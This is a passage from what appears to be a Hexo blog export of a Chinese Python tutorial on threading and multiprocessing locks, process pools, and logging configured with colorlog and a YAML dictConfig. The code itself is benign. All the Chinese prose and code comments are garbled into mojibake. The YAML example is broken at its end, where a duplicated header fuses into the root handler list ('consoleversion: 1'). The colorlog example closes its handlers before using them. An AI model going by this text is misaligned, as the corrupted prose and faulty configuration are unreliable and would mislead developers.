è·å¾—lockå¯¹è±¡ï¼ŒlockçŠ¶æ€å˜ä¸ºlockedï¼Œå¹¶ä¸”é˜»å¡å…¶ä»–çº¿ç¨‹è·å–lockå¯¹è±¡</span></span><br><span class="line">        ZERO += <span class="number">1</span></span><br><span class="line">        ZERO -= <span class="number">1</span></span><br><span class="line">        LOCK.release() <span class="comment"># é‡Šæ”¾lockå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo2</span>():</span><br><span class="line">    <span class="keyword">global</span> ZERO</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>**<span class="number">7</span>):	<span class="comment"># å¤šæ¬¡æ“ä½œ</span></span><br><span class="line">        <span class="keyword">with</span> LOCK:	<span class="comment"># å¦ä¸€ç§ä½¿ç”¨æ–¹æ³•ï¼šä½¿ç”¨ with ç®€åŒ–æ“ä½œ</span></span><br><span class="line">            ZERO += <span class="number">1</span></span><br><span class="line">            ZERO -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    thread_array = [Thread(target=foo) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">    [t.start() <span class="keyword">for</span> t <span class="keyword">in</span> thread_array]</span><br><span class="line">    [t.join() <span class="keyword">for</span> t <span class="keyword">in</span> thread_array]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(ZERO)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h2 id="Multiprocessingåº“"><a href="#Multiprocessingåº“" class="headerlink" title="Multiprocessingåº“"></a>Multiprocessingåº“</h2><blockquote>
<p>Python ä¸­çš„å¤šè¿›ç¨‹æ˜¯é€šè¿‡ multiprocessing åŒ…æ¥å®ç°çš„ï¼Œå’Œå¤šçº¿ç¨‹çš„ threading.Thread å·®ä¸å¤šï¼Œå®ƒå¯ä»¥åˆ©ç”¨ multiprocessing.Process å¯¹è±¡æ¥åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡ï¼Œå…¶ä½¿ç”¨æ–¹æ³•ä¸threadingåº“å¾ˆåƒã€‚</p>
</blockquote>
<h3 id="ç®€å•åº”ç”¨-1"><a href="#ç®€å•åº”ç”¨-1" class="headerlink" title="ç®€å•åº”ç”¨"></a>ç®€å•åº”ç”¨</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">n</span>):</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;test process: <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    process_array = [Process(target=foo, args=(i,)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">    [p.start() <span class="keyword">for</span> p <span class="keyword">in</span> process_array]</span><br><span class="line">    [p.join() <span class="keyword">for</span> p <span class="keyword">in</span> process_array]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main process finish&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h3 id="å¼€å‘åº”ç”¨-1"><a href="#å¼€å‘åº”ç”¨-1" class="headerlink" title="å¼€å‘åº”ç”¨"></a>å¼€å‘åº”ç”¨</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WorkerProcess</span>(<span class="title class_ inherited__">Process</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, func</span>):</span><br><span class="line">        Process.__init__(self)</span><br><span class="line">        self.name = name</span><br><span class="line">        self.func = func</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot; Run the thread &quot;&quot;&quot;</span></span><br><span class="line">        self.func(self.name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Started worker <span class="subst">&#123;name&#125;</span>&#x27;</span>)</span><br><span class="line">    worker_time = random.randint(<span class="number">1</span>, <span class="number">5</span>)</span><br><span class="line">    time.sleep(worker_time)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span> worker finished in <span class="subst">&#123;worker_time&#125;</span> seconds&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    process_array = [WorkerProcess(name=<span class="string">f&#x27;computer_<span class="subst">&#123;i&#125;</span>&#x27;</span>, func=worker) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">    [p.start() <span class="keyword">for</span> p <span class="keyword">in</span> process_array]</span><br><span class="line">    [p.join() <span class="keyword">for</span> p <span class="keyword">in</span> process_array]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main process finish&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="è¿›ç¨‹æ± "><a href="#è¿›ç¨‹æ± " class="headerlink" title="è¿›ç¨‹æ± "></a>è¿›ç¨‹æ± </h3><blockquote>
<p>å½“éœ€è¦å¯åŠ¨å¤§é‡çš„å­è¿›ç¨‹ï¼Œå¯ä»¥ç”¨è¿›ç¨‹æ± çš„æ–¹å¼æ‰¹é‡åˆ›å»ºå­è¿›ç¨‹</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wait_task</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Run task <span class="subst">&#123;name&#125;</span>, <span class="subst">&#123;os.getpid()&#125;</span>&#x27;</span>)</span><br><span class="line">    start = time.time()</span><br><span class="line">    time.sleep(random.random() * <span class="number">3</span>)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Task <span class="subst">&#123;name&#125;</span> runs <span class="subst">&#123;end-start&#125;</span> seconds&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Parent process %s.&#x27;</span> % os.getpid())</span><br><span class="line">    p = Pool(<span class="number">9</span>)	<span class="comment"># é»˜è®¤å¤§å°æ˜¯CPUçš„æ ¸æ•°</span></span><br><span class="line"></span><br><span class="line">    [p.apply_async(wait_task, args=(i,)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;All subprocesses done&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="è¿›ç¨‹é”"><a href="#è¿›ç¨‹é”" class="headerlink" title="è¿›ç¨‹é”"></a>è¿›ç¨‹é”</h3><blockquote>
<p>å¯¹äºæ‰€æœ‰åœ¨<code>threading</code>å­˜åœ¨çš„åŒæ­¥åŸè¯­ï¼Œ<code>multiprocessing</code>ä¸­éƒ½æœ‰ç±»ä¼¼çš„ç­‰ä»·ç‰©ã€‚</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Lock, Process</span><br><span class="line"></span><br><span class="line">LOCK = Lock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">with</span> LOCK:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>:<span class="subst">&#123;os.getpid()&#125;</span> is running&#x27;</span>)</span><br><span class="line">        time.sleep(random.randint(<span class="number">1</span>,<span class="number">3</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>:<span class="subst">&#123;os.getpid()&#125;</span> is done&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    [Process(target=foo, args=(i,)).start() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>æŠ€æœ¯è®°å½•</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Threading</tag>
        <tag>Multiprocessing</tag>
      </tags>
  </entry>
  <entry>
    <title>Python ä½¿ç”¨ YAML é…ç½®å¸¦æœ‰é¢œè‰²è¾“å‡ºçš„loging</title>
    <url>/dfbb4c9/</url>
    <content><![CDATA[<blockquote>
<p>å®˜æ–¹æ•™ç¨‹æ–‡æ¡£ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy9ob3d0by9sb2dnaW5nLmh0bWw=">ğŸšª</span><br>å®˜æ–¹é…ç½®æ–‡æ¡£ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy9saWJyYXJ5L2xvZ2dpbmcuY29uZmlnLmh0bWw=">ğŸšª</span><br>æ ¼å¼å±æ€§è¡¨ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvemgtdHcvMy9saWJyYXJ5L2xvZ2dpbmcuaHRtbCNsb2dnaW5nLkxvZ1JlY29yZA==">ğŸ”</span><br>å¦‚ä½•å†™å¥½æ—¥å¿— -&gt; <span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTU5NTE5">ğŸ”</span></p>
</blockquote>
<h2 id="â­å¸¸ç”¨åè¯"><a href="#â­å¸¸ç”¨åè¯" class="headerlink" title="â­å¸¸ç”¨åè¯"></a>â­å¸¸ç”¨åè¯</h2><table>
<thead>
<tr>
<th>å…³é”®å­—</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>Logger</td>
<td>æ—¥å¿—è®°å½•ç¨‹åº</td>
</tr>
<tr>
<td>Handler</td>
<td>å¤„ç†ç¨‹åº</td>
</tr>
<tr>
<td>Formatter</td>
<td>æ ¼å¼åŒ–ç¨‹åº</td>
</tr>
<tr>
<td>CRITICAL</td>
<td>å±é™©</td>
</tr>
<tr>
<td>ERROR</td>
<td>é”™è¯¯</td>
</tr>
<tr>
<td>WARNING</td>
<td>è­¦å‘Š</td>
</tr>
<tr>
<td>INFO</td>
<td>ä¿¡æ¯</td>
</tr>
<tr>
<td>DEBUG</td>
<td>è°ƒè¯•</td>
</tr>
</tbody></table>
<h2 id="ğŸŒ å…ˆæœ‰ä¸ªå°è±¡"><a href="#ğŸŒ å…ˆæœ‰ä¸ªå°è±¡" class="headerlink" title="ğŸŒ å…ˆæœ‰ä¸ªå°è±¡"></a>ğŸŒ å…ˆæœ‰ä¸ªå°è±¡</h2><p>æ—¥å¿—åº“é‡‡ç”¨æ¨¡å—åŒ–æ–¹æ³•ï¼Œå¹¶æä¾›å‡ ç±»ç»„ä»¶ï¼šè®°å½•å™¨ã€å¤„ç†å™¨ã€è¿‡æ»¤å™¨å’Œæ ¼å¼å™¨ã€‚</p>
<ul>
<li>è®°å½•å™¨æš´éœ²äº†åº”ç”¨ç¨‹åºä»£ç ç›´æ¥ä½¿ç”¨çš„æ¥å£ã€‚</li>
<li>å¤„ç†å™¨å°†æ—¥å¿—è®°å½•ï¼ˆç”±è®°å½•å™¨åˆ›å»ºï¼‰å‘é€åˆ°é€‚å½“çš„ç›®æ ‡ã€‚</li>
<li>è¿‡æ»¤å™¨æä¾›äº†æ›´ç²¾ç»†çš„é™„åŠ åŠŸèƒ½ï¼Œç”¨äºç¡®å®šè¦è¾“å‡ºçš„æ—¥å¿—è®°å½•ã€‚(æœ¬æ–‡ä¸æ¶‰åŠ)</li>
<li>æ ¼å¼å™¨æŒ‡å®šæœ€ç»ˆè¾“å‡ºä¸­æ—¥å¿—è®°å½•çš„æ ·å¼ã€‚</li>
</ul>
<h2 id="ğŸ§¿æœ€å°ä½¿ç”¨æ¡ˆä¾‹"><a href="#ğŸ§¿æœ€å°ä½¿ç”¨æ¡ˆä¾‹" class="headerlink" title="ğŸ§¿æœ€å°ä½¿ç”¨æ¡ˆä¾‹"></a>ğŸ§¿æœ€å°ä½¿ç”¨æ¡ˆä¾‹</h2><p><strong>ä½¿ç”¨æ ¹è®°å½•å™¨è¾“å‡ºæ—¥å¿—</strong><br>ç®€å•äº†è§£æ—¥å¿—è¾“å‡ºæ–¹å¼çš„ä¸¤ç§æ–¹å¼å’Œæ—¥å¿—è¾“å‡ºçš„ç­‰çº§</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="comment"># é»˜è®¤æ ¹è®°å½•åªè®°å½•WARNINGä»¥ä¸Šçš„æ—¥å¿—, æ‰€ä»¥ä½¿ç”¨debugå’Œinfoæ˜¯ä¸ä¼šè¢«è¾“å‡ºçš„</span></span><br><span class="line"><span class="comment"># logging.basicConfig(level=logging.DEBUG) # é…ç½®ä¸‹æ—¥å¿—ç­‰çº§å°±è¾“å‡ºäº†</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½®æ—¥å¿—æ–‡ä»¶è·¯å¾„, ä¼šå†™åˆ°æ–‡ä»¶é‡Œ</span></span><br><span class="line"><span class="comment"># logging.basicConfig(filename=&#x27;example.log&#x27;, level=logging.INFO)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è°ƒç”¨ æ ¹æ—¥å¿—è®°å½•å™¨ è¾“å‡º(è®°å½•ç­‰çº§ä»é«˜åˆ°ä½)</span></span><br><span class="line">logging.debug(<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">logging.info(<span class="string">&#x27;INFO&#x27;</span>)</span><br><span class="line">logging.warning(<span class="string">&#x27;WARNING&#x27;</span>)</span><br><span class="line">logging.error(<span class="string">&#x27;ERROR&#x27;</span>)</span><br><span class="line">logging.critical(<span class="string">&#x27;CRITICAL&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>æ ¼å¼åŒ–æ—¥å¿—è¾“å‡º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="comment"># format æ ¼å¼åŒ–è¾“å‡ºå½¢å¼</span></span><br><span class="line"><span class="comment"># ä½¿ç”¨ datefmt å¯ä»¥è‡ªå®šä¹‰æ—¶é—´è¾“å‡ºæ ¼å¼</span></span><br><span class="line">logging.basicConfig(<span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s %(levelname)s: %(message)s&#x27;</span>, datefmt=<span class="string">&#x27;%m/%d/%Y %I:%M:%S %p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">logging.warning(<span class="string">&#x27;å†ä¸ç­¾åˆ°å°±è¿Ÿåˆ°äº†!&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="ğŸŒˆå¸¦ç‚¹é¢œè‰²è¾“å‡º"><a href="#ğŸŒˆå¸¦ç‚¹é¢œè‰²è¾“å‡º" class="headerlink" title="ğŸŒˆå¸¦ç‚¹é¢œè‰²è¾“å‡º"></a>ğŸŒˆå¸¦ç‚¹é¢œè‰²è¾“å‡º</h2><blockquote>
<p>åŸºæœ¬ä½¿ç”¨, äº†è§£3å¤§ç»„ä»¶è®°å½•å™¨ã€å¤„ç†å™¨å’Œæ ¼å¼å™¨ä¹‹é—´çš„å…³ç³»</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> colorlog</span><br><span class="line"></span><br><span class="line"><span class="comment"># é¢œè‰²é…ç½®</span></span><br><span class="line"><span class="comment"># å¯ç”¨: black red green yellow blue purple cyan white, å’Œ bold_**</span></span><br><span class="line">log_colors = &#123;</span><br><span class="line">    <span class="string">&#x27;DEBUG&#x27;</span>: <span class="string">&#x27;cyan&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;INFO&#x27;</span>: <span class="string">&#x27;green&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;WARNING&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ERROR&#x27;</span>: <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CRITICAL&#x27;</span>: <span class="string">&#x27;bold_red&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæ—¥å¿—è®°å½•å™¨</span></span><br><span class="line">logger = logging.getLogger(<span class="string">&#x27;logger_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæ§åˆ¶å°å¤„ç†å™¨, ä¼šåœ¨æ§åˆ¶å°è¾“å‡ºæ—¥å¿—</span></span><br><span class="line">console_handler = logging.StreamHandler()</span><br><span class="line"><span class="comment"># åˆ›å»ºæ–‡ä»¶å¤„ç†å™¨, ä¼šè®°å½•æ—¥å¿—åˆ°test.log</span></span><br><span class="line">file_handler = logging.FileHandler(filename=<span class="string">&#x27;test.log&#x27;</span>, mode=<span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®æ—¥å¿—çº§åˆ«</span></span><br><span class="line">logger.setLevel(logging.DEBUG)</span><br><span class="line">console_handler.setLevel(logging.DEBUG)</span><br><span class="line">file_handler.setLevel(logging.INFO)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨æŒ‡å®šçš„æ ¼å¼å­—ç¬¦ä¸²åˆå§‹åŒ–æ ¼å¼åŒ–ç¨‹åº</span></span><br><span class="line">file_formatter = logging.Formatter(</span><br><span class="line">    fmt=<span class="string">&#x27;[%(asctime)s %(levelname)s] %(filename)s -&gt; %(funcName)s line:%(lineno)d: %(message)s&#x27;</span>,</span><br><span class="line">    datefmt=<span class="string">&#x27;%Y-%m-%d  %H:%M:%S&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># ä½¿ç”¨ colorlog çš„æ ¼å¼åŒ–ç¨‹åº</span></span><br><span class="line">console_formatter = colorlog.ColoredFormatter(</span><br><span class="line">    fmt=<span class="string">&#x27;%(log_color)s[%(asctime)s %(levelname)s] %(message)s&#x27;</span>,</span><br><span class="line">    datefmt=<span class="string">&#x27;%Y-%m-%d  %H:%M:%S&#x27;</span>,</span><br><span class="line">    log_colors=log_colors</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®æ ¼å¼åŒ–ç¨‹åº</span></span><br><span class="line">console_handler.setFormatter(console_formatter)</span><br><span class="line">file_handler.setFormatter(file_formatter)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ·»åŠ å¤„ç†å™¨åˆ°è®°å½•å™¨ä¸­</span></span><br><span class="line">logger.addHandler(console_handler)</span><br><span class="line">logger.addHandler(file_handler)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…³é—­IOæµ, éå¸¸é‡è¦ </span></span><br><span class="line">console_handler.close()</span><br><span class="line">file_handler.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºæ—¥å¿—</span></span><br><span class="line">logger.info(<span class="string">&#x27;ä¸€åˆ‡æ­£å¸¸~&#x27;</span>)</span><br><span class="line">logger.error(<span class="string">&#x27;æŠ¥é”™å•¦!!&#x27;</span>)</span><br><span class="line">logger.debug(<span class="string">&#x27;æ‰¾bugä¸­...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å½“å‰å¤„ç†å™¨</span></span><br><span class="line"><span class="built_in">print</span>(logger.handlers)</span><br></pre></td></tr></table></figure>



<h2 id="âœ¨ä½¿ç”¨YAMLé…ç½®æ—¥å¿—"><a href="#âœ¨ä½¿ç”¨YAMLé…ç½®æ—¥å¿—" class="headerlink" title="âœ¨ä½¿ç”¨YAMLé…ç½®æ—¥å¿—"></a>âœ¨ä½¿ç”¨YAMLé…ç½®æ—¥å¿—</h2><blockquote>
<p>æ¥è§¦YAMLæ˜¯åœ¨æ­å»ºåšå®¢æ—¶, å‘ç°äº†å¦‚æ­¤ç®€æ´ä¼˜é›…çš„æ–‡ä»¶æ ¼å¼, æ­é¡¹ç›®æ—¶è€ƒè™‘åˆ°é…ç½®çš„æ˜“ç”¨æ€§å’Œæ˜“è¯»æ€§, éšå³ä¾¿æŠ˜è…¾èµ·æ¥äº†Ï†(*ï¿£0ï¿£)</p>
<p>pyyamlå®˜æ–¹æ–‡æ¡£ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9weXlhbWwub3JnL3dpa2kvUHlZQU1MRG9jdW1lbnRhdGlvbg==">ğŸšª</span></p>
</blockquote>
<p>åœ¨<code>conf</code>ç›®å½•ä¸‹åˆ›å»º<code>log_conf.yml</code>, å­˜æ”¾é…ç½®, é…ç½®æœ€åå°†è½¬ä¸ºdistä¼ å…¥åˆ°<code>dictConfig()</code>é‡Œ, è¿™ä¹Ÿæ˜¯è¿›ä¸€æ­¥äº†è§£loggingçš„è¿‡ç¨‹.</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="number">1</span></span><br><span class="line"><span class="comment"># å°†ä¿¡æ¯ä¼ æ’­åˆ°é…ç½®æ–‡ä»¶çš„è·Ÿæ—¥å¿—è®°å½•å™¨ä¸­</span></span><br><span class="line"><span class="attr">disable_existing_loggers:</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¼å¼åŒ–å™¨</span></span><br><span class="line"><span class="attr">formatters:</span></span><br><span class="line">  <span class="attr">file:</span> <span class="comment"># æ ¼å¼åŒ–å™¨id, è‡ªå®šä¹‰</span></span><br><span class="line">    <span class="attr">datefmt:</span> <span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span></span><br><span class="line">    <span class="attr">format:</span> <span class="string">&#x27;%(asctime)s.%(msecs)03d|%(levelname)s|[%(process)d,%(thread)d]|[%(filename)s,%(lineno)d,%(funcName)s]|%(message)s&#x27;</span></span><br><span class="line">  <span class="attr">color:</span></span><br><span class="line">    <span class="comment"># ä½¿ç”¨ç‰¹æ®Šé”®&#x27;()&#x27;ä¼ å…¥æ ¼å¼åŒ–å™¨, ä¸‹é¢çš„é…ç½®ä¼šä½œä¸ºå‚æ•°ä¼ å…¥, åŒç†, å¤„ç†å™¨ã€è¿‡æ»¤å™¨ä¹Ÿæ”¯æŒè‡ªå®šä¹‰å¯¹è±¡</span></span><br><span class="line">    <span class="string">():</span> <span class="string">&#x27;colorlog.ColoredFormatter&#x27;</span> <span class="comment"># =&gt; colorlog.ColoredFormatter(**kwargs)</span></span><br><span class="line">    <span class="attr">datefmt:</span> <span class="string">&#x27;%m-%d %H:%M:%S&#x27;</span></span><br><span class="line">    <span class="attr">format:</span> <span class="string">&#x27;%(white)s%(asctime)s %(reset)s%(log_color)s[%(levelname)s %(process)d]%(reset)s %(cyan)s%(reset)s%(message)s&#x27;</span></span><br><span class="line">    <span class="attr">log_colors:</span></span><br><span class="line">      <span class="attr">DEBUG:</span> <span class="string">cyan</span></span><br><span class="line">      <span class="attr">INFO:</span> <span class="string">green</span></span><br><span class="line">      <span class="attr">WARNING:</span> <span class="string">yellow</span></span><br><span class="line">      <span class="attr">ERROR:</span> <span class="string">red</span></span><br><span class="line">      <span class="attr">CRITICAL:</span> <span class="string">bold_red</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤„ç†ç¨‹åº</span></span><br><span class="line"><span class="attr">handlers:</span></span><br><span class="line">  <span class="attr">console:</span></span><br><span class="line">    <span class="attr">class:</span> <span class="string">logging.StreamHandler</span> <span class="comment"># è¿™æ˜¯å¤„ç†ç¨‹åºç±»çš„å®Œæ•´åç§°</span></span><br><span class="line">    <span class="attr">formatter:</span> <span class="string">color</span>  <span class="comment"># å¤„ç†ç¨‹åºæ‰€å¯¹åº”æ ¼å¼åŒ–å™¨çš„ID</span></span><br><span class="line">    <span class="attr">level:</span> <span class="string">DEBUG</span>  <span class="comment"># å¤„ç†ç¨‹åºçš„çº§åˆ«</span></span><br><span class="line">    <span class="comment"># filters: [allow_foo]  # ç”±å¤„ç†ç¨‹åºæ‰€å¯¹åº”è¿‡æ»¤å™¨çš„ID ç»„æˆçš„åˆ—è¡¨</span></span><br><span class="line">  <span class="attr">file:</span></span><br><span class="line">    <span class="attr">class:</span> <span class="string">logging.handlers.RotatingFileHandler</span></span><br><span class="line">    <span class="attr">formatter:</span> <span class="string">file</span></span><br><span class="line">    <span class="attr">level:</span> <span class="string">INFO</span></span><br><span class="line">    <span class="attr">filename:</span> <span class="string">logconfig.log</span></span><br><span class="line">    <span class="attr">maxBytes:</span> <span class="number">52428800</span> <span class="comment"># 1024*1024*50</span></span><br><span class="line">    <span class="attr">backupCount:</span> <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ—¥å¿—è®°å½•å™¨</span></span><br><span class="line"><span class="attr">loggers:</span></span><br><span class="line">  <span class="attr">my_logger:</span></span><br><span class="line">    <span class="comment"># level: ERROR # è¿™é‡Œçš„ä¼˜å…ˆçº§é«˜</span></span><br><span class="line">    <span class="attr">handlers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">console</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">file</span></span><br><span class="line">    <span class="comment"># æ‰“å¼€æ—¥å¿—è®°å½•å™¨</span></span><br><span class="line">    <span class="attr">propagate:</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹è®°å½•å™¨é…ç½®</span></span><br><span class="line"><span class="attr">root:</span></span><br><span class="line">  <span class="attr">level:</span> <span class="string">DEBUG</span></span><br><span class="line">  <span class="attr">handlers:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">consoleversion:</span> <span class="number">1</span></span><br><span class="line"><span class="comment"># å°†ä¿¡æ¯ä¼ æ’­åˆ°é…ç½®æ–‡ä»¶çš„è·Ÿæ—¥å¿—è®°å½•å™¨ä¸­</span></span><br><span class="line"><span class="attr">disable_existing_loggers:</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p><strong>ä»£ç éƒ¨åˆ†</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> logging.config</span><br><span class="line"></span><br><span class="line">LOG_CONF_DIR = <span class="string">r&#x27;config/log_conf.yml&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file=LOG_CONF_DIR, mode=<span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    log_conf = yaml.load(stream=f, Loader=yaml.FullLoader)</span><br><span class="line"></span><br><span class="line">logging.config.dictConfig(config=log_conf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æ—¥å¿—è®°å½•å™¨</span></span><br><span class="line">logger = logging.getLogger(<span class="string">&#x27;my_logger&#x27;</span>)</span><br><span class="line"></span><br><span class="line">logger.debug(<span class="string">&#x27;æ‰¾bugä¸­...&#x27;</span>)</span><br><span class="line">logger.info(<span class="string">&#x27;ä¸€åˆ‡æ­£å¸¸~&#x27;</span>)</span><br><span class="line">logger.error(<span class="string">&#x27;æŠ¥é”™å•¦!!&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="è®°å½•æµç¨‹å›¾"><a href="#è®°å½•æµç¨‹å›¾" class="headerlink" title="è®°å½•æµç¨‹å›¾"></a>è®°å½•æµç¨‹å›¾</h2><blockquote>
